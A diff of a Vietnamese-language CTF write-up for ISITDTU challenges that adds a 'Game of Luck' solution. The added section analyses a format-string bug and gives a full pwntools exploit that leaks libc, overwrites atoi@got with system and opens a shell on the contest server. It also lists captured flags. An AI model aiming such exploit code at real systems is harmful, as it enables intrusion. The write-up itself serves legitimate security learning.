@@ -661,8 +661,8 @@ payload = asm("""
 p.send(payload)
 
 p.interactive() 
-# ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}
 ```
+Flag là `ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}`
 
 ## pwn/shellcode 2
 
@@ -753,8 +753,226 @@ payload2 = asm("""
 p.send(payload2)
 
 p.interactive() 
-# ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}
 ```
+
+Flag là `ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}`
+
+## pwn/Game of Luck
+
+{{< admonition note "Challenge Information" >}}
+* 43 solves / 100 pts
+* **Given files:** [chal](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERNFcvJ6e1hJpa1dCZ_7Vi0BuGrWTSPjcJKarUz4mA63_Q?e=xatAA3)
+* **Description:** `nc 152.69.210.130 2004`
+{{< /admonition >}}
+
+**Solution** 
+
+### Overview & Find bug
+
+Chương trình chính sau khi được rename lại như sau 
+```c
+void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  init();
+  welcome();
+  get_random_number();
+  game();
+}
+```
+
+trong đó hàm `game` là hàm xử lý chính 
+
+<img src="./27.png">
+
+Nhìn tổng quan, có 2 lựa chọn cho người chơi: 
+1. Lấy giá trị ngẫu nhiên trong khoảng [0, 100] qua hàm `get_random_number`.
+2. Chơi game đoán giá trị ngẫu nhiên thông qua hàm `play`.
+
+```c
+__int64 play()
+{
+  unsigned int v0; // eax
+  int random_number; // [rsp+8h] [rbp-8h]
+
+  v0 = clock();
+  srand(v0);
+  random_number = rand();
+  printf("Enter your guess: ");
+  if ( get_int_number() != random_number )
+  {
+    puts("Incorrect!");
+    exit(0);
+  }
+  puts("Correct!");
+  if ( ++point == 10 )
+  {
+    enter_name();                               // fmt bug
+    exit(0);
+  }
+  return 0LL;
+}
+``` 
+
+Ở trong hàm `play` này, ta thấy được có bug Format String ở hàm `enter_name`.
+```c
+__int64 enter_name()
+{
+  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
+  unsigned __int64 v2; // [rsp+108h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  printf("Enter your name: ");
+  read(0, buf, 216uLL);
+  printf(buf, point);
+  return 0LL;
+}
+```
+
+### Exploit 
+
+Chúng ta chỉ có 1 bug duy nhất FSB trong hàm `play`. Mình sẽ tiếp tục tìm kiếm xem có cách nào để tái sử dụng bug này được nhiều lần hay không.
+
+Quay về hàm `game`, đây là đoạn code khiến mình quan tâm nhất.
+```c
+  unsigned int choice; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
+
+  v1 = __readfsqword(0x28u);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      printf("Score: %u points\n", point);
+      puts("0. Lucky Number\n1. Play\n2. Exit");
+      __isoc99_scanf("%1u", &choice);           // bypass with "-"
+      while ( getchar() != 10 )
+        ;
+      if ( choice != 68 )
+        break;
+      enter_name();                             // choice = 68
+    }
+    [...]
+  }
+```
+
+Nhập duy nhất một chữ số unsigned int, nghĩa là chỉ được nhập trong khoảng [0, 9]. Vì vậy, việc `choice = 68` là bất khả thi. Có 2 điều chúng ta cần quan tâm ở đây đó là: 
+1. Nếu nhập input không đúng với fmt của hàm `scanf` thì `choice` sẽ không bị thay đổi giá trị. 
+2. Đứng ở góc độ hàm `main` nhìn xuống, giá trị `choice` trong hàm `game` nằm ở vị trí `rbp-0xC`, đây cũng chính là địa chỉ chứa giá trị random của hàm `get_random_number`. 
+
+Tới đây thì ý tưởng đã rõ. Chúng ta sẽ spam mãi cho tới khi lấy được lucky number = 68. Tiếp tục nhập `choice` với `-` để sử dụng được bug FMT nhiều lần. 
+
+Bên cạnh đó, nhìn vào hàm `get_int_number` sẽ thấy nó cho phép nhập vào mảng `buf`. Ta sẽ overwrite `atoi@got` thành `system`, khi đó `atoi("/bin/sh")` sẽ là `system("/bin/sh")`. 
+
+```c
+int get_int_number()
+{
+  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  read(0, buf, 0xFuLL);
+  return atoi(buf);
+}
+```
+
+Full exploit 
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./chal") 
+libc = ELF("//usr/lib/x86_64-linux-gnu/libc.so.6")
+# ld = ELF("./ld-2.35.so")
+
+context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+
+def debug():
+    gdb.attach(p, gdbscript = """
+        b* 0x40157A
+        continue
+    """)
+    pause() 
+
+# debug()
+
+while True: 
+    # p = process(exe.path)
+    p = remote("152.69.210.130", 2004)
+
+    sl  = p.sendline
+    sa  = p.sendafter
+    sla = p.sendlineafter
+    rl  = p.recvline
+    ru  = p.recvuntil
+
+    ru(b"Lucky number: ")
+    lucky_number = int(rl().strip(), 10)
+
+    if lucky_number == 68: 
+        break  
+    else: 
+        p.close() 
+
+sl(b"-")
+payload = b"%67$p"
+sla(b"name: ", payload) 
+
+libc_leak = int(rl().strip(), 16)
+libc_base = libc_leak - libc.symbols["__libc_start_main"] - 128 
+system = libc_base + libc.symbols["system"]
+
+log.info(f"libc base = {hex(libc_base)}")
+log.info(f"libc leak = {hex(libc_leak)}")
+log.info(f"system = {hex(system)}")
+
+package = {
+    (system >> 0 ) & 0xFFFF : exe.got["atoi"],
+    (system >> 16) & 0xFFFF : exe.got["atoi"] + 2, 
+    (system >> 32) & 0xFFFF : exe.got["atoi"] + 4 
+}
+sorted_package = sorted(package) 
+
+payload =  f"%{sorted_package[0]}c%12$hn".encode() 
+payload += f"%{sorted_package[1] - sorted_package[0]}c%13$hn".encode() 
+payload += f"%{sorted_package[2] - sorted_package[1]}c%14$hn".encode() 
+payload = payload.ljust(0x30, b"P") 
+payload += flat(
+    package[sorted_package[0]],
+    package[sorted_package[1]],
+    package[sorted_package[2]]
+)
+
+sl(b"-") 
+sla(b"name: ", payload) 
+
+sl(b"1")
+sla(b"guess: ", b"/bin/sh")
+
+p.interactive() 
+```
+Flag thu được là `ISITDTU{a0e1948f76e189794b7377d8e3b585bfa99d7ed0de7e6a6ff01c2fd95bdf3f72}`. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <!--
 # List challenges
@@ -772,14 +990,6 @@ rev/FlagCpp
 * 6 solves / 486 pts / by ks75vl
 * **Given files:** [FlagCpp_5C9F861EFCC1AFF273C435E3CC988438.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EVxUcWswr9dDpgp6dliEmegBuIlCMyD9yrrI2shOlmwArw?e=mwWGaf)
 * **Description:** Trust me, this program was written in `C++`.
-{{< /admonition >}}
-
-pwn/Game of Luck
-
-{{< admonition note "Challenge Information" >}}
-* 43 solves / 100 pts
-* **Given files:** [chal](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERNFcvJ6e1hJpa1dCZ_7Vi0BuGrWTSPjcJKarUz4mA63_Q?e=xatAA3)
-* **Description:** `nc 152.69.210.130 2004`
 {{< /admonition >}}
 
 pwn/no_name
